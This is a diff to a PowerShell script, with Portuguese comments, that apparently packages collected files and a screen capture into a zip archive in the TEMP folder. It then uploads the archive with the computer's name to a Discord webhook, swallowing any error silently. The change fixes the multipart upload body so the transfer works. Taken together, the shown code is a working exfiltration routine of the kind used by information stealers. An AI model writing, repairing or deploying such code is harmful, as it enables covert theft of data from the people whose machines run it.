@@ -71,26 +71,26 @@ $g.Dispose(); $bmp.Dispose()
 $zip = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).zip"
 Compress-Archive -Path "$kit\*" -Destination $zip -Force
 
-# 11) Envia para o Discord (correção do -Form)
+# 11) Envia para o Discord (corpo montado sem aspas quebradas)
 $FileBin = [System.IO.File]::ReadAllBytes($zip)
-$Enc = [System.Text.Encoding]::GetEncoding('iso-8859-1')
-$FileEnc = $Enc.GetString($FileBin)
+$Enc      = [System.Text.Encoding]::GetEncoding('iso-8859-1')
+$fileEnc  = $Enc.GetString($FileBin)
 $boundary = [System.Guid]::NewGuid().ToString()
-$LF = "`"
+$CRLF     = "`r`n"
 
-`"
 $bodyLines = (
     "--$boundary",
     "Content-Disposition: form-data; name=`"content`"",
     "",
-    "Kit $(hostname) – $(Get-Date)",
+    "Kit $env:COMPUTERNAME – $(Get-Date)",
     "--$boundary",
     "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path -Leaf $zip)`"",
     "Content-Type: application/octet-stream",
     "",
-    $FileEnc,
+    $fileEnc,
     "--$boundary--"
-) -join $LF
+) -join $CRLF
+
 try {
     Invoke-RestMethod -Uri $hook -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
 } catch {}
